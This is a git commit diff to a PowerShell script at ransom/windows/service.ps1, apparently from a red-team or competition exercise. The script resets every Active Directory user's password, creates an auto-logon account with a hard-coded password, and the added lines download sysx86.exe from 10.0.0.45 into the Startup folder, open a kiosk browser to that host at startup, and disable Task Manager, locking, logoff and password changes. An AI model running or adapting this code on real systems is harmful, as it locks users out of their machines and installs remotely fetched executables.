da2988bd783c7b94911cf1ccd4e83bcf4d153445
6903-EthicalHacker <44905220+6903-EthicalHacker@users.noreply.github.com>
2018-11-28 23:53:56 -0800

    Added commands to hide ctrl alt del options and commands to run at startup

--- ransom/windows/service.ps1
+++ ransom/windows/service.ps1
@@ -1,4 +1,4 @@
-$DefaultUsername = "NewGuest14"
+$DefaultUsername = "elbrown42"
 $DefaultPassword = "P@ssw0rd!"
 $DomainName = "TEAM10"
 $DomainUser = $DomainName + "\" + $DefaultUsername
@@ -8,6 +8,15 @@ Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-Secur
 New-ADUser $DefaultUsername -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
-Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
+Set-ItemProperty $RegPath "DomainUsername" -Value "$DefaultUsername" -type String 
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 ntrights.exe +r "SeInteractiveLogonRight" -u $DomainUser
+New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Name smbsvcs.bat -Value """C:\Program Files\Internet Explorer\iexplore.exe"" -k ""http://10.0.0.45"""
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DisableLockWorkstation" -Value 1
+iwr 10.0.0.45/sysx86.exe 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysx86.exe'
+New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableTaskMgr" -Value 1
+New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "NoLogoff" -Value 1
+New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableChangePassword" -Value 1
+New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "HideFastUserSwitching" -Value 1
+New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name "StartMenuLogOff" -Value 1
+
